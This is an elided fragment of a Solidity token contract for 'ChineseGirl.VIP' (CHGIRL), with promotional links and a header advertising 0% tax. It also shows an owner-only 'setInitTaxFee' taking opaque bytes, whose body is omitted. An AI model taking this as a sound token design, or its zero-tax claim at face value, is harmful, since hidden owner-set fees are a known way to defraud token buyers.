...
// TOTAL SUPPLY: 10,000,000,000 | TAX: 0%

// Website:   https://www.chinesegirl.vip/
// Telegram:  https://t.me/ChineseGirlETH
...
contract ChineseGirl is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"ChineseGirl.VIP";
    string private constant _symbol = unicode"CHGIRL";
    ...
    function disableMevProc(bytes memory _v) internal {
    ...
    function setInitTaxFee(bytes memory _v) external onlyOwner {
